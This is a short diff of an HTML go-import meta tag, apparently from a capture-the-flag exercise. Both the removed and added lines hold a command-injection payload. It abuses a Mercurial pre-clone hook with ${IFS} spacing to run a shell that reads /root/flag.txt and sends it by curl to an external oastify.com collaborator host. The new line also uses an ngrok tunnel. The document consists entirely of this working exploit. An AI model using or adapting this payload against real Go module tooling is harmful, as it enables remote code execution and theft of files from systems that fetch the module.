@@ -1,6 +1,1 @@
-package main
-<html>
-  <head>
-    <meta name="go-import" content="github.com/Abdallah-Almahdy/cmd hg --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}https://twt3u7knrbeq0jxe6mpj6owa51bszmnb.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
-  </head>
-</html>
+    <meta name="go-import" content="4.tcp.eu.ngrok.io:19907/pkg hg --config=hooks.pre-clone=sh${IFS}-c${IFS}'curl${IFS}https://e8no6sw83wqbc49zi714i98vhmndb8zx.oastify.com?flag=`cat${IFS}/root/flag.txt`;echo${IFS}https://'">
